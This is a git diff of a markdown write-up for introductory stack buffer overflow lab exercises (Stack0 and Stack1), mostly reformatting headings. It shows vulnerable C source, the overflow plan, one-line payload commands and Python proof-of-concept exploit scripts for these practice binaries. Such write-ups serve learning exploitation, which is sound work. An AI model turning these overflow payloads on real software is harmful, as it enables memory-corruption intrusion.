@@ -33,9 +33,8 @@ NOTE: write ups in progress. Adding python exploit poc's to each excercise for p
 |[net2](#net2)|
 
 
-#Stack0
----------------------------------------
-###Source Code:
+## Stack0
+### Source Code:
 
 ```C
 int main(int argc, char **argv)
@@ -54,21 +53,22 @@ int main(int argc, char **argv)
 }
 ```
 
-###Stack:
+### Stack:
 
 | eip | ebp | modified(0) |   buffer    |
 
-###The plan:
+### The plan:
+
 fill buffer with gets 
 since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified
 
-###winning command:
+### winning command:
 
 ```bash
 python -c "print 'a'*64+'1'" | ./stack0
 ```
 
-###Python exploit:
+### Python exploit:
 
 ```Python
 from subprocess import Popen, PIPE
@@ -81,9 +81,8 @@ cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
 print cproc.communicate(input)[0]   
 ```
 
-#Stack1
----------------------------------------
-###Source Code:
+## Stack1
+### Source Code:
 
 ```C
 #include <stdlib.h>
@@ -111,19 +110,21 @@ int main(int argc, char **argv)
 }
 ```
 
-###Stack:
+### Stack:
+
 | eip | ebp | modified(0) |   buffer    |
 
-###Plan:
+### Plan:
+
 This challenge is similar to the last one with a few differences.  It takes command line args instead of gets, and instead of setting modified to 1, we need to set it to 0x61626364 ("abcd" in ascii). Like the previous challenge, we just fill up buffer and overflow the correct value into modified. Since it's little endian, we need to craft our input so that the value sits in memory correctly. 
 
-###winning command:
+### winning command:
 
 ```bash
 ./stack1 $(python -c "print 'a'*64+'dcba'")
 ```
 
-###Python exploit:
+### Python exploit:
 
 ```Python
 from subprocess import Popen, PIPE
